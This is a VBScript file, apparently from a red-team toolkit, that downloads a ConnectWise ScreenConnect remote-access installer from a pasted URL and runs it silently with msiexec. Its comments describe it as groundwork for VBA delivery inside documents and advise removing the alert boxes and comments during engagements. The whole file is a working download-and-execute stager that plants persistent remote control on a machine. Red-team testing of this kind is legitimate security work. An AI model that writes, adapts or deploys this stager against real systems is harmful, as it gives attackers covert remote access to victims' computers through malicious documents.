Option Explicit

' This is an install script for ConnectWise ScreenConnect RMM, using VBS.
' Our intention for this, is to build toward delivery options via VBA for red team document delivery testing.
' Only use this in an ethical and legal manner. 
' For red team engagements, depending on context you may want to remove the system alerts and comments.  
' See Readme.md file for instructions.  

Dim installerName, downloadUrl, downloadPath
Dim exitCode

' 1) Define file & URL
installerName = "ConnectWise_agent(My_Organization).msi"
downloadUrl   = "(Paste Install URL here)"

' 2) Save path = same folder as this .vbs script
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim scriptFolder : scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)
downloadPath = scriptFolder & "\" & installerName

WScript.Echo "Downloading ConnectWise agent installer..."
DownloadFile downloadUrl, downloadPath

WScript.Sleep 3000

' 3) Confirm file exists
If Not fso.FileExists(downloadPath) Then
    MsgBox "Download failed. File not found at: " & downloadPath, vbCritical, "Error"
    WScript.Quit 1
End If

WScript.Echo "Installing ConnectWise agent silently..."
' 4) Run msiexec with silent switches
Dim wshShell : Set wshShell = CreateObject("WScript.Shell")
exitCode = wshShell.Run("msiexec /i """ & downloadPath & """ /qn /norestart", 0, True)

' 5) Check exit code
Select Case exitCode
    Case 0
        MsgBox "ConnectWise agent installed successfully.", vbInformation, "Success"
    Case 3010
        MsgBox "Agent installed successfully. Reboot is required to complete installation.", vbExclamation, "Installed (Reboot Required)"
    Case Else
        MsgBox "Installation failed with exit code: " & exitCode, vbCritical, "Install Failed"
End Select

WScript.Quit 0


' DownloadFile: Downloads a file from URL to savePath using WinHTTP,
'              writes binary data via ADODB.Stream

Sub DownloadFile(ByVal url, ByVal savePath)
    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Dim ado : Set ado = CreateObject("ADODB.Stream")
        ado.Type = 1  ' adTypeBinary
        ado.Open
        ado.Write http.ResponseBody
        ado.SaveToFile savePath, 2  ' adSaveCreateOverWrite
        ado.Close
    Else
        WScript.Echo "HTTP error: " & http.Status & " - " & http.StatusText
    End If
End Sub
